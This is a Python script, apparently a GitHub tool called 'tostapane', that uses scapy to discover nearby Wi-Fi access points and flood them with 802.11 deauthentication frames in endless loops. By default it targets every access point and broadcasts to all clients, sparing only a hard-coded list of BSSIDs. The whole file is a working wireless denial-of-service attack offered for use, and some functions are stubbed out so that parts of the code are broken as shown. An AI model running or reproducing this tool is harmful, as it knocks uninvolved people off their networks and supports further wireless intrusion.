# TOSTAPANE BY github.com/n0nexist
import scapy.all as scapy
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
from datetime import datetime as dt
import threading
import os
import time
import sys

if len(sys.argv) < 2:
    print(f"⛔ Try: {sys.argv[0]} help")
    exit()

if sys.argv[1].lower() == "help":
    # Help message...
    exit()

wireless_interface = sys.argv[1]
ap_list = []

def capture_packets(access_point_mac):
    # Function to capture packets...
    return packets

def channel_thread():
    # Channel switching...
    while True:
        for x in range(1, 14):
            os.popen(f"iwconfig {wireless_interface} channel {x}").read()
            time.sleep(1)

def get_timestamp():
    # Get timestamp...
    d = dt.now()
    return f"[{d.year}_{d.month}_{d.day} {d.hour}:{d.minute}:{d.second}]"

def send_deauth_frame(accesspoint_mac, victim_mac, reasonCode):
    # Deauthentication frame sending...

    global wireless_interface

    # Add the BSSIDs you want to exclude from deauthentication
    exclude_bssids = ["08:6a:0a:2b:f8:17", "08:6a:0a:2b:f8:18", "08:6a:0a:2b:f8:19", "08:6a:0a:2b:f8:20"]

    # Check the BSSID of the victim before sending deauthentication frames
    if accesspoint_mac in exclude_bssids:
        print(f"ℹ️ Excluding {victim_mac} from deauthentication because it is connected to BSSID: {accesspoint_mac}")
        return

    # Continue with the deauthentication process for non-excluded stations
    pkt = RadioTap() / Dot11(type=0, subtype=12, addr1=victim_mac, addr2=accesspoint_mac, addr3=accesspoint_mac) / Dot11Deauth(reason=reasonCode)
    
    try:
        amount = int(sys.argv[5])
    except:
        amount = 100
    try:
        pktDelay = float(sys.argv[6])
    except:
        pktDelay = 0.1

    while True:
        print(f"🖥 {get_timestamp()} Using {amount} packets to deauthenticate {victim_mac} from {accesspoint_mac} (code={reasonCode}, delay={pktDelay})")
        sendp(pkt, iface=wireless_interface, count=amount, inter=pktDelay, verbose=False)

def processVictim(process_me, victim):
    # Attack the victim...
    try:
        deauthcode = int(sys.argv[4])
    except:
        deauthcode = 7
    threading.Thread(target=send_deauth_frame, args=(process_me, victim, deauthcode,)).start()

def processAccessPoint(process_me):
    # Handle the discovery of an access point...
    try:
        ap_target = sys.argv[2]
    except:
        ap_target = "ALL"
    try:
        victim_mac = sys.argv[3]
    except:
        victim_mac = "ALL"

    if ap_target == "ALL" or ap_target == process_me:
        print(f"🍞 Toasting {process_me}")
        if victim_mac == "ALL":
            processVictim(process_me, "ff:ff:ff:ff:ff:ff")
        else:
            packets = capture_packets(process_me)
            mac_addresses = set(packet.addr2 for packet in packets)
            for mac in mac_addresses:
                if mac == victim_mac:
                    processVictim(process_me, mac)

def handlePackets(pkt):
    # Packet handler...
    if pkt.haslayer(scapy.Dot11Elt) and pkt.type == 0 and pkt.subtype == 8: 
        if pkt.addr2 not in ap_list:
            ap_list.append(pkt.addr2)
            print(f"\n✅ Found {pkt.info.decode()} at {pkt.addr2}")
            
            # Check if the BSSID should be excluded
            if pkt.addr2 in ["08:6a:0a:2b:f8:17", "08:6a:0a:2b:f8:18", "08:6a:0a:2b:f8:19", "08:6a:0a:2b:f8:20"]:
                print(f"ℹ️ Excluding {pkt.info.decode()} at {pkt.addr2} from deauthentication")
            else:
                threading.Thread(target=processAccessPoint, args=(pkt.addr2,)).start()

def startSniffing():
    # Start packet sniffing...
    threading.Thread(target=channel_thread).start()
    scapy.sniff(iface=wireless_interface, prn=handlePackets, timeout=300)

def main():
    # Main function...
    print("""
  _______
 |       |
 |   ___|_
 |  |     |
 |__|_____|
 |________|
/_________\\
[ tostapane wifi deauthentication program ]
[      coded by github.com/n0nexist       ]
    """)
    print("😈 Starting...")
    startSniffing()

try:
    main()
except Exception as e:
    print(f"❌ Something bad happened: {e}")
